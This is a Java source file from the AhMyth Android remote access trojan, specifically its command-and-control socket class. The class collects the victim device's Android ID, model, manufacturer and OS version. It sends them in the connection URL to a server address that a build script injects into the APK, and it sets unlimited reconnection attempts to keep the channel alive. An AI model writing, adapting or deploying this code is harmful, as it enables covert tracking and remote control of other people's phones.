package ahmyth.mine.king.ahmyth;

import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * Created by AhMyth on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
        try {
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            
            // Socket.IO options for stable connection - match server timeouts
            IO.Options opts = new IO.Options();
            opts.timeout = 60000;           // 60 second connection timeout (match server pingTimeout)
            opts.reconnection = true;       // Auto reconnect
            opts.reconnectionAttempts = Integer.MAX_VALUE;  // Unlimited reconnection attempts
            opts.reconnectionDelay = 2000;  // 2 second delay between reconnects
            opts.reconnectionDelayMax = 10000;  // Max 10 second delay
            opts.forceNew = false;          // Reuse connections
            opts.randomizationFactor = 0.5; // Randomize reconnection delay
            
            // This placeholder URL will be replaced during APK build
            // Format: http://IP:PORT - the build script will inject actual server IP/PORT
            // For Android emulator, use 10.0.2.2 to reach host machine
            String url = "http://10.0.2.2:1234?model=" + android.net.Uri.encode(Build.MODEL)
                + "&manf=" + Build.MANUFACTURER 
                + "&release=" + Build.VERSION.RELEASE 
                + "&id=" + deviceID;
            
            android.util.Log.d("IOSocket", "Connecting to: " + url);
            
            // Pass opts to IO.socket()
            ioSocket = IO.socket(url, opts);
        } catch (URISyntaxException e) {
            android.util.Log.e("IOSocket", "Invalid socket URL", e);
            e.printStackTrace();
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error initializing socket", e);
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}
